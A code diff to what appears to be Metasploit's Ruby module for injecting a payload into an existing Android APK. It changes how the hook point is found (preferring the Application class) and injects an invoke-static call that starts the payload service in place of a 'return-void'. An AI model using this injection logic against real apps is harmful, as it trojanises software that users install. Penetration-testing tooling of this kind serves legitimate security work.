@@ -35,9 +35,14 @@ class Msf::Payload::Apk
     end
   end
 
-  # Find the activity that is opened when you click the app icon
-  def find_launcher_activity(amanifest)
+  # Find a suitable smali point to hook
+  def find_hook_point(amanifest)
     package = amanifest.xpath("//manifest").first['package']
+    application = amanifest.xpath('//application')
+    application_name = application.attribute("name")
+    if application_name
+      return application_name.to_s
+    end
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities
       activityname = activity.attribute("targetActivity")
@@ -117,7 +122,7 @@ class Msf::Payload::Apk
 
   def parse_orig_cert_data(orig_apkfile)
     orig_cert_data = Array[]
-    keytool_output = run_cmd("keytool -J-Duser.language=en -printcert -jarfile #{orig_apkfile}")
+    keytool_output = run_cmd("keytool -J-Duser.language=en -printcert -jarfile '#{orig_apkfile}'")
     owner_line = keytool_output.match(/^Owner:.+/)[0]
     orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
     orig_cert_data.push("#{orig_cert_dname}")
@@ -192,24 +197,22 @@ class Msf::Payload::Apk
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
     print_status "Locating hook point..\n"
-    launcheractivity = find_launcher_activity(amanifest)
-    unless launcheractivity
-      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
-    end
-    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
+    hookable_class = find_hook_point(amanifest)
+    smalifile = "#{tempdir}/original/smali*/" + hookable_class.gsub(/\./, "/") + ".smali"
     smalifiles = Dir.glob(smalifile)
     for smalifile in smalifiles
       if File.readable?(smalifile)
-        activitysmali = File.read(smalifile)
+        hooksmali = File.read(smalifile)
+        break
       end
     end
 
-    unless activitysmali
-      raise RuntimeError, "Unable to find hookable activity in #{smalifiles}\n"
+    unless hooksmali
+      raise RuntimeError, "Unable to find hook point in #{smalifile}\n"
     end
 
     entrypoint = 'return-void'
-    unless activitysmali.include? entrypoint
+    unless hooksmali.include? entrypoint
       raise RuntimeError, "Unable to find hookable function in #{smalifile}\n"
     end
 
@@ -247,7 +250,7 @@ class Msf::Payload::Apk
     payloadhook = %Q^invoke-static {}, L#{package_slash}/#{classes['MainService']};->start()V
 
     ^ + entrypoint
-    hookedsmali = activitysmali.sub(entrypoint, payloadhook)
+    hookedsmali = hooksmali.sub(entrypoint, payloadhook)
 
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
